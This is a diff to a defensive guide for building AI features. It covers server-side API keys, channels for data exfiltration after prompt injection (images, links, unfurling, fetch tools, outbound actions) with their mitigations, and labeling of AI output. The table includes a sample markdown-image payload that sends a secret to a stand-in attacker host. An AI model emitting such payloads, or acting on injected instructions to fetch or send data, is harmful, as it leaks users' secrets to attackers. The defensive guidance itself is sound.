@@ -114,7 +114,9 @@ signals in consumer products, show vetted help resources from code, not model-wr
 
 An unauthenticated or generous AI endpoint is a free model API for someone else's product.
 
-- Call the model only from the server. A provider key in client code is public within hours.
+- Call the model only from the server. A provider key shipped in client code is public: anyone
+  can read it from the bundle or the network tab and spend on the account. If one has shipped,
+  revoke it; removing it from the code is not enough.
 - Require an authenticated account for anything costly. For anonymous demos: a tiny fixed
   budget per visitor, a bot challenge, the cheapest model, low output caps, and a global daily
   spend cap that turns the demo off.
@@ -139,7 +141,7 @@ After an injection, the attacker needs a way out. Close each one.
 |---|---|---|
 | Markdown image | `![x](https://evil.example/?d=SECRET)` is fetched by the browser on render, with no click | Do not render images from model output, or allow only an image-host allowlist, or rewrite through a proxy that fetches only allowlisted hosts. Back it with a CSP `img-src` limited to known hosts |
 | Links | User clicks a link with data in the query string | Show the destination; allowlist domains for auto-linked URLs; interstitial for unknown external hosts; never auto-open |
-| Link previews (unfurling) | A chat or email client fetches the URL automatically | Disable unfurling for model-generated content sent to chat tools |
+| Link previews (unfurling) | A chat or email client fetches the URL automatically, with no click | Disable unfurling for model-generated content sent to chat tools (in Slack, `unfurl_links: false` and `unfurl_media: false` on the message), or strip URLs whose host is not allowlisted before sending |
 | Fetch or browse tools | Agent requests an attacker URL with data embedded | Allow fetching only URLs that came from the user or from a trusted search step, or a domain allowlist; never URLs composed by the model after reading untrusted content |
 | Outbound action tools (email, webhook, comment, issue) | Data sent to a third party | Approval showing recipient and body; recipient allowlist (own organization) |
 | Writes to shared places | Secret written where the attacker can read it later (public page, shared doc) | Treat writes to wider-visibility locations as external sends |
@@ -154,8 +156,10 @@ element contains the canary.
 
 - Mark AI-generated content where it appears, and keep the mark when the content is stored,
   shared or exported, so later readers know its origin. Tell users in a conversational feature
-  that they are talking to an AI. Legal disclosure duties (including the EU AI Act) are owned by
-  `0x:privacy-compliance`; labeling is the right product default regardless.
+  that they are talking to an AI. Whether disclosure is legally required depends on the
+  jurisdiction and the use (the EU AI Act and several US state laws have transparency rules
+  with different scopes and dates): `0x:privacy-compliance` owns that question. Labeling is the
+  right product default regardless.
 - State the limits once, near the output, in plain words ("AI-generated; check important
   details"). Per-message boilerplate gets ignored.
 - Give every AI output a report control (thumbs down plus an optional reason, or "report a
